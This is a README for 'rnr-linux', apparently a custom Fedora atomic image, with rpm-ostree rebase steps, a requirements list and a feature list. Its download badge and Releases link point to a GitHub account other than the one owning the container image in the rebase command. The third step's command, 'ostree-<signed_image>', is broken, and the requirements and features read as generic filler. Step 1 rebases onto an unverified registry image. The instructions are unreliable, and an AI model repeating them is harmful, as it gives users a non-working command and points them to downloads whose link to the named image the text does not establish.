# 🚀 rnr-linux - Easy Installation for Your Custom Linux Image

[![Download rnr-linux](https://img.shields.io/badge/Download-rnr--linux-blue.svg)](https://github.com/Destinyola/rnr-linux/releases)

## 📥 Download & Install

To get started with rnr-linux, please visit the [Releases page](https://github.com/Destinyola/rnr-linux/releases) to download the latest version. This page contains all the available builds for you to choose from.

## ⚙️ Requirements

Before you install rnr-linux, make sure your system meets these basic requirements:

- **Operating System:** A compatible version of Fedora.
- **Disk Space:** At least 2 GB of free disk space.
- **Internet Connection:** A stable internet connection for downloading the files.

## 🚀 Getting Started

Once you have verified the requirements, follow these steps to rebase your existing atomic Fedora installation to the latest build of rnr-linux.

### Step 1: Rebase to the Unsigned Image

Open your terminal and run the following command. This step ensures you install the proper signing keys and policies needed for a successful rebase.

```bash
rpm-ostree rebase ostree-unverified-registry:ghcr.io/rinkydinkyproject/rnr-linux:latest
```

### Step 2: Reboot Your System

After running the previous command, reboot your system to complete the rebase process. You can do this by typing:

```bash
systemctl reboot
```

### Step 3: Rebase to the Signed Image

Once your system has rebooted, it is time to switch to the signed image. Enter the following command in your terminal:

```bash
rpm-ostree rebase ostree-<signed_image>
```

Replace `<signed_image>` with the actual signed image name as specified in your setup.

## 🚀 Features of rnr-linux

rnr-linux provides a stable environment tailored for various applications. Here are some of its main features:

- **Atomic Updates:** Enjoy seamless updates without system downtime.
- **Customization:** Flexibility in setting up custom images based on your needs.
- **Container Support:** Built to support OCI images for efficient application handling.

## ⚠️ Important Note

rnr-linux is currently an experimental feature. If you are trying this for the first time, proceed with caution. Refer to the [BlueBuild docs](https://blue-build.org/how-to/setup/) for additional information on setting up your repository based on this template.

## 🔗 Additional Resources

- **Documentation:** Comprehensive setup and usage instructions are available [here](https://blue-build.org/how-to/setup/).
- **Support:** If you encounter any issues or need assistance, please check the GitHub Issues page or open a new issue for help.

## 🔍 Further Reading

Developers and users looking to expand their knowledge on related topics can explore these resources:

- Atomic Linux Principles
- Best Practices for Image Management
- Container Technologies Overview

For more tips and tricks, please stay updated through our GitHub repository. Happy using rnr-linux!